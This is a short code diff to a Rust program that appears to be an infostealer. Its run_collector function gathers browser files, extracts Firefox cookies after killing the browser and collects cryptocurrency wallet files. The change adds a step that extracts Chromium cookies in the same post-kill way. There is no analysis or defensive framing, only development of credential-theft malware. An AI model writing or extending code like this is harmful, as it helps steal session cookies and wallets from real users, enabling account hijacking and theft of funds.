@@ -102,6 +102,8 @@ pub async fn run_collector() -> Result<(), Box<dyn std::error::Error>> {
     browsers::merge_files(&mut all_files, chromium_pre);
     let gecko_cookie_retry = browsers::gecko::extract_cookies_post_kill();
     browsers::merge_files(&mut all_files, gecko_cookie_retry);
+    let chromium_cookie_retry = browsers::chromium::extract_cookies_post_kill();
+    browsers::merge_files(&mut all_files, chromium_cookie_retry);
     browsers::common::zipp::sort_entries(&mut all_files);
 
     let wallet_files = wallet::collect_wallets();
